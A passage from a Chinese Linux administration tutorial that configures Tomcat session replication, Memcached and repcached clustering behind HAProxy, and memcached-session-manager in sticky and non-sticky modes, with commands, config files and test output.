            <Interceptor className="org.apache.catalina.tribes.group.interceptors.TcpFailureDetector"/>
            <Interceptor className="org.apache.catalina.tribes.group.interceptors.MessageDispatchInterceptor"/>
          </Channel>

          <Valve className="org.apache.catalina.ha.tcp.ReplicationValve"
                 filter=""/>
          <Valve className="org.apache.catalina.ha.session.JvmRouteBinderValve"/>

          <Deployer className="org.apache.catalina.ha.deploy.FarmWarDeployer"
                    tempDir="/tmp/war-temp/"
                    deployDir="/tmp/war-deploy/"
                    watchDir="/tmp/war-listen/"
                    watchEnabled="false"/>

          <ClusterListener className="org.apache.catalina.ha.session.ClusterSessionListener"/>
        </Cluster>
      </Host>
      
      
      
      


#2.修改web.xml文件
[root@tomcat1 ~]# cp /usr/local/tomcat/webapps/ROOT/WEB-INF/ /data/webapps/ROOT/ -a
[root@tomcat1 ~]# vim /data/webapps/ROOT/WEB-INF/web.xml 

<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"
  version="3.1"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to Tomcat
  </description>
<distributable/>   #添加此行
</web-app>
[root@tomcat1 ~]# systemctl restart tomcat.service
```

**10.0.0.28**

```
#1.配置server.xml信息
[root@tomcat2 ~]# vim /usr/local/tomcat/conf/server.xml
      <Host name="www.liusenbiao.org"  appBase="/data/webapps"
              unpackWARs="true" autoDeploy="true">
       <Cluster className="org.apache.catalina.ha.tcp.SimpleTcpCluster"
                 channelSendOptions="8">

          <Manager className="org.apache.catalina.ha.session.DeltaManager"
                   expireSessionsOnShutdown="false"
                   notifyListenersOnReplication="true"/>

          <Channel className="org.apache.catalina.tribes.group.GroupChannel">
            <Membership className="org.apache.catalina.tribes.membership.McastService"
                        address="228.6.6.6"
                        port="45564"
                        frequency="500"
                        dropTime="3000"/>
            <Receiver className="org.apache.catalina.tribes.transport.nio.NioReceiver"
                      address="10.0.0.28"
                      port="4000"
                      autoBind="100"
                      selectorTimeout="5000"
                      maxThreads="6"/>

            <Sender className="org.apache.catalina.tribes.transport.ReplicationTransmitter">
              <Transport className="org.apache.catalina.tribes.transport.nio.PooledParallelSender"/>
            </Sender>
            <Interceptor className="org.apache.catalina.tribes.group.interceptors.TcpFailureDetector"/>
            <Interceptor className="org.apache.catalina.tribes.group.interceptors.MessageDispatchInterceptor"/>
          </Channel>

          <Valve className="org.apache.catalina.ha.tcp.ReplicationValve"
                 filter=""/>
          <Valve className="org.apache.catalina.ha.session.JvmRouteBinderValve"/>

          <Deployer className="org.apache.catalina.ha.deploy.FarmWarDeployer"
                    tempDir="/tmp/war-temp/"
                    deployDir="/tmp/war-deploy/"
                    watchDir="/tmp/war-listen/"
                    watchEnabled="false"/>

          <ClusterListener className="org.apache.catalina.ha.session.ClusterSessionListener"/>
        </Cluster>
      </Host>
      
      
      
      
      

#2.修改web.xml文件
[root@tomcat2 ~]# cp /usr/local/tomcat/webapps/ROOT/WEB-INF/ /data/webapps/ROOT/ -a
[root@tomcat2 ~]# vim /data/webapps/ROOT/WEB-INF/web.xml

<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"
  version="3.1"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to Tomcat
  </description>
<distributable/>    #添加此行
</web-app>
[root@tomcat2 ~]# systemctl restart tomcat.service
```

**机器在变，SessionID不变，说明Session复制集群成功！！！**

**这个方法的缺点就是占用较大的内存空间，只适用于小规模环境**

![1657419994301](linux体系.assets/1657419994301.png)

![1657420007025](linux体系.assets/1657420007025.png)

### 44.6 Memcached缓存

![1657422098361](linux体系.assets/1657422098361.png)

#### 44.6.1 Memcached介绍

```
Memcached 只支持能序列化的数据类型，不支持持久化，基于Key-Value的内存缓存系统

memcached 虽然没有像redis所具备的数据持久化功能，比如RDB和AOF都没有，但是可以通过做集群同步的方式，让各memcached服务器的数据进行同步，从而实现数据的一致性，即保证各memcached的数据是一样的，即使有任何一台 memcached 发生故障，只要集群中有一台memcached 可用就不会出现数据丢失，当其他memcached 重新加入到集群的时候,可以自动从有数据的memcached 当中自动获取数据并提供服务。

Memcached 借助了操作系统的 libevent 工具做高效的读写。libevent是个程序库，它将Linux的epoll、BSD类操作系统的kqueue等事件处理功能封装成统一的接口。即使对服务器的连接数增加，也能发挥高性能。memcached使用这个libevent库，因此能在Linux、BSD、Solaris等操作系统上发挥其高性能

Memcached 支持最大的内存存储对象为1M，超过1M的数据可以使用客户端压缩或拆分报包放到多个key中，比较大的数据在进行读取的时候需要消耗的时间比较长，memcached 最适合保存用户的session实现session共享

Memcached存储数据时, Memcached会去申请1MB的内存, 把该块内存称为一个slab, 也称为一个pageMemcached 支持多种开发语言，包括：JAVA,C,Python,PHP,C#,Ruby,Perl等。

Memcached 官网：http://memcached.org/
```

#### 44.6.2 Memcached和Redis比较

|    比较类别    |                            Redis                             |                          memcached                           |
| :------------: | :----------------------------------------------------------: | :----------------------------------------------------------: |
| 支持的数据结构 |                  哈希、列表、集合、有序集合                  |                         纯kev-value                          |
|   持久化支持   |                              有                              |                              无                              |
|   高可用支持   | redis支持集群功能，可以实现主动复制，读写分 离。官方也提供了sentinel集群管理工具，能够实现 主从服务监控，故障自动转移，这一切，对于客户端 都是透明的，无需程序改动，也无需人工介入 |                         需要二次开发                         |
| 存储value容量  |                           最大512M                           |                            最大1M                            |
|    内存分配    |                  临时申请空间，可能导致碎片                  |       预分配内存池的方式管理内存，能够省去内存分配时间       |
|  虚拟内存使用  | 有自己的VM机制，理论上能够存储比物理内存更多 的数据，当数据超量时，会引发swap，把冷数据刷 到磁盘上 |                  所有的数据存储在物理内存里                  |
|    网络模型    | 非阻塞IO复用模型,提供一些非KV存储之外的排序， 聚合功能，在执行这些功能时，复杂的CPU计算，会 阻塞整个IO调度 |                       非阻塞IO复用模型                       |
| 水平扩展的支持 |                  redis cluster 可以横向扩展                  |                             暂无                             |
|     多线程     |                  Redis6.0之前是只支持单线程                  |      Memcached支持多线程,CPU 利用方面Memcache优于 Redis      |
|    过期策略    |                   有专门线程，清除缓存数据                   | 懒淘汰机制：每次往缓存放入 数据的时候，都会存一个时 间，在读取的时候要和设置的 时间做TTL比较来判断是否过期 |
|    单机QPS     |                            约10W                             |                            约60W                             |
|  源代码可读性  |                         代码清爽简洁                         |    可能是考虑了太多的扩展性， 多系统的兼容性，代码不清爽     |
|    适用场景    | 复杂数据结构、有持久化、高可用需求、value存储 ，内容较大的时候 |           纯KV，数据量非常大，并发量 非常大的业务            |

#### 44.6.3 Memcached工作机制

##### 44.6.3.1 内存分配机制

```
#1.内存分配机制概述
应用程序运行需要使用内存存储数据，但对于一个缓存系统来说，申请内存、释放内存将十分频繁，非常容易导致大量内存碎片，最后导致无连续可用内存可用。(核心思想：假是有一个书架哎，要存放图书，图书有大有小，我们采取大小格的思想，把书柜切分成不同容量的格子来存放不同类型的图书)

Memcached采用了Slab Allocator机制来分配、管理内存。

     Page：分配给Slab的内存空间，默认为1MB，分配后就得到一个Slab。Slab分配之后内存按照固定字节大小等分      成chunk。
     
     Chunk：用于缓存记录k/v值的内存空间。Memcached会根据数据大小选择存到哪一个chunk中，假设chunk有          128bytes、64bytes等多种，数据只有100bytes存储在128bytes中，存在少许浪费。
     Chunk最大就是Page的大小，即一个Page中就一个Chunk
        
     Slab Class：Slab按照Chunk的大小分组，就组成不同的Slab Class, 第一个Chunk大小为96B的                  SlabClass1,Chunk 120B为Class 2,如果有100bytes要存，那么Memcached会选择下图中Slab Class 2存          储，因为它是120bytes的Chunk。Slab之间的差异可以使用Growth Factor控制，默认1.25。
```

![1657425157964](linux体系.assets/1657425157964.png)

**范例：查看Slab Class** 

```
#-f, --slab-growth-factor=<num> chunk size growth factor (default: 1.25)
[root@centos8 ~]#memcached -u memcached -f 2 -vv
slab class   1: chunk size        96 perslab   10922
slab class   2: chunk size       192 perslab    5461
slab class   3: chunk size       384 perslab    2730
slab class   4: chunk size       768 perslab    1365
slab class   5: chunk size      1536 perslab     682
slab class   6: chunk size      3072 perslab     341
slab class   7: chunk size      6144 perslab     170
slab class   8: chunk size     12288 perslab      85
slab class   9: chunk size     24576 perslab      42
slab class  10: chunk size     49152 perslab      21
slab class  11: chunk size     98304 perslab      10
slab class  12: chunk size    196608 perslab       5
slab class  13: chunk size    524288 perslab       2
<27 server listening (auto-negotiate)
<28 server listening (auto-negotiate)
```

##### 44.6.3.2 懒过期Lazy Expiration

```
memcached不会监视数据是否过期，而是在取数据时才看是否过期，如果过期,把数据有效期限标识为0，并不清除该数据。以后可以覆盖该位置存储其它数据。
```

##### 44.6.3.3 LRU

```
当内存不足时，memcached会使用LRU（Least Recently Used）机制来查找可用空间，分配给新记录使用。
```

#### 44.6.4 Memcached安装和启动

##### 44.6.4.1 yum安装

```
[root@centos8 ~]# yum -y install memcached
#修改端口绑定的IP为当前主机的所有IP
[root@centos8 ~]# vim /etc/sysconfig/memcached
PORT="11211"
USER="memcached"
MAXCONN="1024"
CACHESIZE="64"
OPTIONS=""  #修改此行
[root@centos8 ~]# systemctl enable --now memcached.service
[root@centos8 ~]# ss -ntl
State    Recv-Q   Send-Q     Local Address:Port       Peer Address:Port   
LISTEN   0        128              0.0.0.0:11211           0.0.0.0:*    #修改成功！！
```

##### 44.6.4.2 一键编译安装Memcached脚本

```
#!/bin/bash
#      
#********************************************************************
#Author:        liusenbiao
#Date:          2022-07-10
#FileName：      install_tomcat.sh
#Description：  在线一键编译安装Memcached脚本
#********************************************************************
MEMCACHED_URL=http://liusenbiao.cn/download/tars/memcached
MEMCACHED=memcached-1.6.15
INSTALL_DIR=/apps/memcached

rpm -q wget &> /dev/null || yum -y install wget
yum -y install gcc  libevent-devel libmemcached


wget $MEMCACHED_URL/$MEMCACHED.tar.gz
tar xvf $MEMCACHED.tar.gz
cd $MEMCACHED/
./configure  --prefix=$INSTALL_DIR
make && make install

echo PATH=$INSTALL_DIR/bin:'$PATH' > /etc/profile.d/memcached.sh
. /etc/profile.d/memcached.sh

useradd -r -s /sbin/nologin memcached

cat > /etc/sysconfig/memcached <<EOF
PORT="11211"
USER="memcached"
MAXCONN="1024"
CACHESIZE="64"
OPTIONS=""
EOF


cat > /lib/systemd/system/memcached.service  <<EOF
[Unit]
Description=memcached daemon
Before=httpd.service
After=network.target

[Service]
EnvironmentFile=/etc/sysconfig/memcached
ExecStart=$INSTALL_DIR/bin/memcached -p \${PORT} -u \${USER} -m \${CACHESIZE} -c \${MAXCONN} \$OPTIONS

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload 
systemctl enable --now memcached.service


#安装完成后exit以下即可使用
```

![1657445046111](linux体系.assets/1657445046111.png)

#### 44.6.5 Memcached操作命令

**帮助文档**

```
[root@centos8 ~]#cat /usr/share/doc/memcached/protocol.txt
```

**Memcached使用**

```
#1.概述
五种基本memcached命令执行最简单的操作。这些命令和操作包括：
set
add
replace
get
delete


#前三个命令是用于操作存储在 memcached 中的键值对的标准修改命令,都使用如下所示的语法：
command <key> <flags> <expiration time> <bytes>
<value>

#参数说明如下：
command set/add/replace
key     key 用于查找缓存值
flags     可以包括键值对的整型参数，客户机使用它存储关于键值对的额外信息
expiration time     在缓存中保存键值对的时间长度（以秒为单位，0 表示永远）
bytes     在缓存中存储的字节点
value     存储的值（始终位于第二行）

#增加key，过期时间为秒，bytes为存储数据的字节数
add key flags exptime bytes






#案例
[root@centos8 ~]# telnet 10.0.0.17 11211
Trying ::1...
Connected to localhost.
Escape character is '^]'.
stats
STAT pid 27208
STAT uptime 242
STAT time 1603035824
STAT version 1.5.9
STAT libevent 2.1.8-stable
STAT pointer_size 64
STAT rusage_user 0.004214
STAT rusage_system 0.040611
STAT max_connections 1024
STAT curr_connections 2
STAT total_connections 4
STAT rejected_connections 0
STAT connection_structures 3
STAT reserved_fds 20
STAT cmd_get 8
STAT cmd_set 4
STAT cmd_flush 1
STAT cmd_touch 0
STAT get_hits 5
STAT get_misses 3
STAT get_expired 0
STAT get_flushed 0
STAT delete_misses 0


#加
add mykey 1 60 4   
add class 1 0 3  #加0永久有效 
test
STORED

#查
get mykey
VALUE mykey 1 4
test
END


#改
set mykey 1 60 5
test1
STORED
get mykey
VALUE mykey 1 5
test1
END

#删除
delete mykey
DELETED
get mykey
END


#清空
flush_all
OK
get mykey
END
quit
```

#### 44.6.6 Memcached集群部署

![1657447543444](linux体系.assets/1657447543444.png)

**10.0.0.8**

```
#HaproxyA
[root@proxy ~]# yum -y install haproxy
[root@proxy ~]# vim /etc/haproxy/haproxy.cfg
#---------------------------------------------------------------------
# main frontend which proxys to the backends
#---------------------------------------------------------------------
listen liu_memcache_11211
    mode tcp
    bind 10.0.0.8:11211
    server m1 10.0.0.17:11211 check
    server m2 10.0.0.27:11211 check
[root@proxy ~]# systemctl restart haproxy.service
```

**10.0.0.18**

```
#HaproxyB
[root@proxy ~]# yum -y install haproxy
[root@proxy ~]# vim /etc/haproxy/haproxy.cfg
#---------------------------------------------------------------------
# main frontend which proxys to the backends
#---------------------------------------------------------------------
listen liu_memcache_11211
    mode tcp
    bind 10.0.0.18:11211
    server m1 10.0.0.17:11211 check
    server m2 10.0.0.27:11211 check
[root@proxy ~]# systemctl restart haproxy.service    
```

**10.0.0.17**

```
#Memcached A
#1.部署repcached
[root@m1 ~]# wget http://liusenbiao.cn/download/tars/memcached-1.2.8-repcached-2.2.1.tar.gz
[root@m1 ~]# yum -y install gcc libevent libevent-devel wget tree lrzsz
[root@m1 ~]# tar xf memcached-1.2.8-repcached-2.2.1.tar.gz
[root@m1 ~]# cd memcached-1.2.8-repcached-2.2.1
[root@m1 memcached-1.2.8-repcached-2.2.1]# ./configure --prefix=/apps/repcached --enable-replication


#项目比较老旧，但一些小公司仍然会使用，需要修改repcached源码，因为项目发布的时候centos7还没有出现
[root@m1 memcached-1.2.8-repcached-2.2.1]# vim memcached.c
#改为如下内容，即删除原有的原第57，59行
/* FreeBSD 4.x doesn't have IOV_MAX exposed. */
#ifndef IOV_MAX
# define IOV_MAX 1024
#endif
[root@m1 memcached-1.2.8-repcached-2.2.1]# make && make install
[root@m1 memcached-1.2.8-repcached-2.2.1]# ln -s /apps/repcached/bin/memcached /usr/bin/
[root@m1 memcached-1.2.8-repcached-2.2.1]# tree /apps/repcached/
/apps/repcached/
├── bin
│   ├── memcached
│   └── memcached-debug
└── share
    └── man
        └── man1
            └── memcached.1
            
            



#2.创建用户
[root@m1 memcached-1.2.8-repcached-2.2.1]# useradd -r -s /sbin/nologin memcached



#3.进行repcach双主同步
[root@m1 memcached-1.2.8-repcached-2.2.1]# memcached -d -m 1024 -p 11211 -u memcached -c 2048 -x 10.0.0.27
```

**10.0.0.27**

```
#Memcached B
#1.部署repcached
[root@m2 ~]# wget http://liusenbiao.cn/download/tars/memcached-1.2.8-repcached-2.2.1.tar.gz
[root@m2 ~]# yum -y install gcc libevent libevent-devel wget tree lrzsz
[root@m2 ~]# tar xf memcached-1.2.8-repcached-2.2.1.tar.gz
[root@m2 ~]# cd memcached-1.2.8-repcached-2.2.1
[root@m2  memcached-1.2.8-repcached-2.2.1]# ./configure --prefix=/apps/repcached --enable-replication


#项目比较老旧，但一些小公司仍然会使用，需要修改repcached源码，因为项目发布的时候centos7还没有出现
[root@m2 memcached-1.2.8-repcached-2.2.1]# vim memcached.c
#改为如下内容，即删除原有的原第57，59行
/* FreeBSD 4.x doesn't have IOV_MAX exposed. */
#ifndef IOV_MAX
# define IOV_MAX 1024
#endif
[root@m2 memcached-1.2.8-repcached-2.2.1]# make && make install
[root@m2 memcached-1.2.8-repcached-2.2.1]# ln -s /apps/repcached/bin/memcached /usr/bin/
[root@centos7 memcached-1.2.8-repcached-2.2.1]# tree /apps/repcached/
/apps/repcached/
├── bin
│   ├── memcached
│   └── memcached-debug
└── share
    └── man
        └── man1
            └── memcached.1
            
            



#2.创建用户
[root@m2 memcached-1.2.8-repcached-2.2.1]# useradd -r -s /sbin/nologin memcached



#3.进行repcach双主同步
[root@m2 memcached-1.2.8-repcached-2.2.1]# memcached -d -m 1024 -p 11211 -u memcached -c 2048 -x 10.0.0.17
```

**10.0.0.7测试**

```
#1.10.0.0.7的机器上写到10.0.0.17上
#查看10.0.0.27是否实现了双主复制
[19:49:38 root@centos7 ~]#telnet 10.0.0.17 11211
Trying 10.0.0.17...
Connected to 10.0.0.17.
Escape character is '^]'.
set class 1 0 3
liu
STORED
get class
VALUE class 1 3
liu
END




#2.查看10.0.0.27是否实现了双主复制
#成功复制！！！！
[20:03:37 root@centos7 ~]#telnet 10.0.0.27 11211
Trying 10.0.0.27...
Connected to 10.0.0.27.
Escape character is '^]'.
get class
VALUE class 1 3
liu
END




#3.测试haproxy
#反向代理成功！！！！
[20:22:00 root@centos7 ~]#telnet 10.0.0.8 11211
Trying 10.0.0.8...
Connected to 10.0.0.8.
Escape character is '^]'.
get class
VALUE class 1 3
liu
END
```

#### 44.6.7 session共享服务器

![1657457034359](linux体系.assets/1657457034359.png)

##### 44.6.7.1 msm安装

```
#1.概述
msm（memcached session manager）提供将Tomcat的session保持到memcached或redis的程序，可以实现高可用。
github网站链接: https://github.com/magro/memcached-session-manager




#2.需要的jar包
参考链接: https://github.com/magro/memcached-session-manager/wiki/SetupAndConfiguration

将spymemcached.jar、memcached-session-manage、kyro相关的jar文件都放到Tomcat的lib目录中去，这个目录是 $CATALINA_HOME/lib/，对应本次安装是/usr/local/tomcat/lib。
kryo-3.0.3.jar
asm-5.2.jar
objenesis-2.6.jar
reflectasm-1.11.9.jar
minlog-1.3.1.jar
kryo-serializers-0.45.jar
msm-kryo-serializer-2.3.2.jar
memcached-session-manager-tc8-2.3.2.jar
spymemcached-2.12.3.jar
memcached-session-manager-2.3.2.jar
```

##### 44.6.7.2 sticky模式

```
sticky 模式即前端tomcat和后端memcached有关联(粘性)关系
参考文档:https://github.com/magro/memcached-session-manager/wiki/SetupAndConfiguration



Tomcat-1 (t1) will primarily store it's sessions in memcached-2 (m2) which is running on another machine (m2 is a regular node for t1). Only if m2 is not available, t1 will store it's sessions in memcached-1 (m1, m1 is the failoverNode for t1). With this configuration, sessions won't be lost when machine 1 (serving t1 and m1) crashes. The following really nice ASCII art shows 
this setup.
大概意思即使一台tomcat对应一个memcached,tomcat1的Session信息不会存储在他对应的那台memcached上,而是存在他的斜对角的memcached机器上，这样设计会有较好的容错性。
<t1>  <t2>
 . \ / .
 .  X  .
 . / \ .
<m1>   <m2>
```

##### 44.6.7.3 non-sticky模式

```
#1.工作原理
non-sticky 模式即前端tomcat和后端memcached无关联(无粘性)关系

从msm 1.4.0之后版本开始支持non-sticky模式。

Tomcat session为中转Session，对每一个SessionID随机选中后端的memcached节点n1(或者n2)为主session，而另一个memcached节点n2(或者是n1)为备session。产生的新的Session会发送给主、备memcached，并清除本Session。

后端两个memcached服务器对一个session来说是一个是主,一个是备,但对所有session信息来说每个memcached即是主同时也是备
如果n1下线，n2则转正。n1再次上线，n2依然是主Session存储节点。
```

##### 44.6.7.4 tomcat和memcached集成在一台主机

![1657460580177](linux体系.assets/1657460580177.png)

**环境准备**

|    IP     | 主机名  |  服务   |           软件           |
| :-------: | :-----: | :-----: | :----------------------: |
| 10.0.0.8  |  proxy  | 调度器  |       Nginx、HTTPD       |
| 10.0.0.18 | tomcat1 | tomcat1 | JDK8、Tomcat8、memcached |
| 10.0.0.28 | tomcat2 | tomcat2 | JDK8、Tomcat8、memcached |

**10.0.0.8**

```
root@proxy:~# vim /etc/nginx/nginx.conf
http {
   ....
    upstream tomcat {
       server 10.0.0.18:8080;
       server 10.0.0.28:8080;
    }
    location / {
       proxy_pass http://tomcat;
     }
}

```

**10.0.0.18**

```
#安装memcached之前先运行我的一键安装二进制tomcat脚本
#1.配置memcached允许外部访问
[root@tomcat1 ~]# yum -y install memcached
[root@tomcat1 ~]# vim /etc/sysconfig/memcached 
PORT="11211"
USER="memcached"
MAXCONN="1024"
CACHESIZE="64"
OPTIONS=""
[root@tomcat1 ~]# systemctl enable --now memcached.service






#2.修改context.xml文件
[root@tomcat1 ~]# vim /usr/local/tomcat/conf/context.xml 
<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<!-- The contents of this file will be loaded for each web application -->
<Context>

    <!-- Default set of monitored resources. If one of these changes, the    -->
    <!-- web application will be reloaded.                                   -->
    <WatchedResource>WEB-INF/web.xml</WatchedResource>
    <WatchedResource>${catalina.base}/conf/web.xml</WatchedResource>

    <!-- Uncomment this to disable session persistence across Tomcat restarts -->
    <!--
    <Manager pathname="" />
    -->
<Manager className="de.javakaffee.web.msm.MemcachedBackupSessionManager"  #sticky模式修改这行
   memcachedNodes="n1:10.0.0.8:11211,n2:10.0.0.28:11211"
   failoverNodes="n1"
   requestUriIgnorePattern=".*\.(ico|png|gif|jpg|css|js)$"
   transcoderFactoryClass="de.javakaffee.web.msm.serializer.kryo.KryoTranscoderFactory"
   />  #到这行
</Context>


#non-sticky模式
<Context>
<Manager className="de.javakaffee.web.msm.MemcachedBackupSessionManager"
   memcachedNodes="n1:10.0.0.8:11211,n2:10.0.0.28:11211"
   sticky="false"   #添加这一行
   sessionBackupAsync="false"   #添加这一行
   lockingMode="uriPattern:/path1|/path2"   #添加这一行
   requestUriIgnorePattern=".*\.(ico|png|gif|jpg|css|js)$"
   transcoderFactoryClass="de.javakaffee.web.msm.serializer.kryo.KryoTranscoderFactory"
   />
</Context>



#支持redis模式
<Context>
<Manager className="de.javakaffee.web.msm.MemcachedBackupSessionManager"
   memcachedNodes="redis://10.0.0.38"     #修改此行
   sticky="false"
   sessionBackupAsync="false"
   lockingMode="uriPattern:/path1|/path2"
   requestUriIgnorePattern=".*\.(ico|png|gif|jpg|css|js)$"
   transcoderFactoryClass="de.javakaffee.web.msm.serializer.kryo.KryoTranscoderFactory"
   />
</Context>







#3.准备jar包
#把http://liusenbiao.cn/download/tars/msm/文件夹下的所有jar包扔到/usr/local/tomcat/lib/里
[root@tomcat1 ~]# cd /usr/local/tomcat/lib/
asm-5.2.jar                                        01-Sep-2021 18:17     52K
kryo-3.0.3.jar                                     01-Sep-2021 18:17    279K
kryo-serializers-0.45.jar                          01-Sep-2021 18:17    123K
minlog-1.3.1.jar                                   01-Sep-2021 18:17    5923
msm-kryo-serializer-2.3.2.jar                      01-Sep-2021 18:17     37K
objenesis-2.6.jar                                  01-Sep-2021 18:17     54K
reflectasm-1.11.9.jar                              01-Sep-2021 18:17     71K
jedis-3.0.0.jar                                    01-Sep-2021 18:14    573K
memcached-session-manager-2.3.2.jar                01-Sep-2021 18:14    163K
memcached-session-manager-tc8-2.3.2.jar            01-Sep-2021 18:14     11K
memcached-session-manager-tc9-2.3.2.jar            01-Sep-2021 18:13     11K
spymemcached-2.12.3.jar                            01-Sep-2021 18:14    463K
[root@tomcat1 lib]# systemctl restart tomcat.service
```

**10.0.0.28**

```
#1.安装memcached之前先运行我的一键安装二进制tomcat脚本
#1.配置memcached允许外部访问
[root@tomcat2 ~]# yum -y install memcached
[root@tomcat2 ~]# vim /etc/sysconfig/memcached 
PORT="11211"
USER="memcached"
MAXCONN="1024"
CACHESIZE="64"
OPTIONS=""
[root@tomcat2 ~]# systemctl enable --now memcached.service





#2.修改context.xml文件
[root@tomcat2 ~]# vim /usr/local/tomcat/conf/context.xml 
<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<!-- The contents of this file will be loaded for each web application -->
<Context>

    <!-- Default set of monitored resources. If one of these changes, the    -->
    <!-- web application will be reloaded.                                   -->
    <WatchedResource>WEB-INF/web.xml</WatchedResource>
    <WatchedResource>${catalina.base}/conf/web.xml</WatchedResource>

    <!-- Uncomment this to disable session persistence across Tomcat restarts -->
    <!--
    <Manager pathname="" />
    -->
<Manager className="de.javakaffee.web.msm.MemcachedBackupSessionManager" #修改这行
   memcachedNodes="n1:10.0.0.8:11211,n2:10.0.0.28:11211"
   failoverNodes="n2"
   requestUriIgnorePattern=".*\.(ico|png|gif|jpg|css|js)$"
   transcoderFactoryClass="de.javakaffee.web.msm.serializer.kryo.KryoTranscoderFactory"
   />  #到这行
</Context>


#non-sticky模式
<Context>
<Manager className="de.javakaffee.web.msm.MemcachedBackupSessionManager"
   memcachedNodes="n1:10.0.0.8:11211,n2:10.0.0.28:11211"
   sticky="false"   #添加这一行
   sessionBackupAsync="false"   #添加这一行
   lockingMode="uriPattern:/path1|/path2"   #添加这一行
   requestUriIgnorePattern=".*\.(ico|png|gif|jpg|css|js)$"
   transcoderFactoryClass="de.javakaffee.web.msm.serializer.kryo.KryoTranscoderFactory"
   />
</Context>




#支持redis模式
<Context>
<Manager className="de.javakaffee.web.msm.MemcachedBackupSessionManager"
   memcachedNodes="redis://10.0.0.38"    #修改此行
   sticky="false"
   sessionBackupAsync="false"
   lockingMode="uriPattern:/path1|/path2"
   requestUriIgnorePattern=".*\.(ico|png|gif|jpg|css|js)$"
   transcoderFactoryClass="de.javakaffee.web.msm.serializer.kryo.KryoTranscoderFactory"
   />
</Context>






#3.准备jar包
#把http://liusenbiao.cn/download/tars/msm/文件夹下的所有jar包扔到/usr/local/tomcat/lib/里
[root@tomcat2 ~]# cd /usr/local/tomcat/lib/
asm-5.2.jar                                        01-Sep-2021 18:17     52K
kryo-3.0.3.jar                                     01-Sep-2021 18:17    279K
kryo-serializers-0.45.jar                          01-Sep-2021 18:17    123K
minlog-1.3.1.jar                                   01-Sep-2021 18:17    5923
msm-kryo-serializer-2.3.2.jar                      01-Sep-2021 18:17     37K
objenesis-2.6.jar                                  01-Sep-2021 18:17     54K
reflectasm-1.11.9.jar                              01-Sep-2021 18:17     71K
jedis-3.0.0.jar                                    01-Sep-2021 18:14    573K
memcached-session-manager-2.3.2.jar                01-Sep-2021 18:14    163K
memcached-session-manager-tc8-2.3.2.jar            01-Sep-2021 18:14     11K
memcached-session-manager-tc9-2.3.2.jar            01-Sep-2021 18:13     11K
spymemcached-2.12.3.jar  
[root@tomcat2 lib]# systemctl restart tomcat.service
```

**10.0.0.7**

```
#客户端测试
#1.编写python测试脚本
[root@m1 ~]# yum -y install python3
[root@m1 ~]# pip3 install python-memcached
[root@m1 ~]# vim showmemcached.py 
#!/usr/bin/python3
import memcache
mc = memcache.Client(['10.0.0.8:11211','10.0.0.28:11211'], debug=True)
#print('-' * 30)
# 查看全部key
#for x in mc.get_stats('items'):  # stats items 返回 items:5:number 1
#    print(x)
print('-' * 30)

for x in mc.get_stats('cachedump 4 0'):
    print(x)
    
    
    

#2.测试结果
#sticky模式
#测试成功，当前访问的是10.0.0.18的机器，session信息放在10.0.0.28上，斜对角
#edge浏览器访问
[root@m1 ~]# ./showmemcached.py 
------------------------------
('10.0.0.18:11211 (1)', {})
('10.0.0.28:11211 (1)', {'343CF98C301DA5606FCB0C5ABE9C2208-n2': '[89 b; 1657507789 s]'})  #斜对角


#chrom浏览器访问
#session信息存到了10.0.0.18上，斜对角存放
[root@m1 ~]# ./showmemcached.py 
------------------------------
('10.0.0.18:11211 (1)', {'0D73AE22970AF37A4E4F754002A9F140-n1': '[89 b; 1657509425 s]'})  #斜对角
